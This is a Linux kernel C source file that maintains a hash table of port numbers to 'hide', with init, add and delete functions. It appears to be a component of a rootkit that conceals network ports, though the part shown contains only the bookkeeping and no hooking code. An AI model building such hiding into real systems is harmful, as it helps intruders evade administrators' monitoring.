#include <linux/hashtable.h>
#include <linux/slab.h>
#include <linux/types.h>

#include "hide_port.h"

DECLARE_HASHTABLE(hide_port_info_list, HIDE_PORT_HASH_TABLE_BITS);

static u32 hide_port_hash(int port) {
    /* simply return value of port as hash value */
    return port;
}

int hide_port_init() {
    hash_init(hide_port_info_list);
    return 0;
}

int hide_port_add(int port) {
    struct hide_port_info *cur;
    struct hide_port_info *info;
    u32 hash;

    hash = hide_port_hash(port);

    /* check if the port is already hidden */
    hash_for_each_possible(hide_port_info_list, cur, node, hash) {
        if (cur->port == port)
            return 0;
    }
    /* allocate for store hide port info */
    info = (struct hide_port_info *)kmalloc(sizeof(struct hide_port_info),
                                            GFP_KERNEL);
    if (!info)
        return -ENOMEM;
    info->port = port;
    hash_add(hide_port_info_list, &info->node, hash);
    return 0;
}

int hide_port_del(int port) {
    struct hide_port_info *cur;
    u32 hash;

    hash = hide_port_hash(port);
    hash_for_each_possible(hide_port_info_list, cur, node, hash) {
        if (cur->port == port) {
            hash_del(&cur->node);
            kfree(cur);
            break;
        }
    }
    return 0;
}
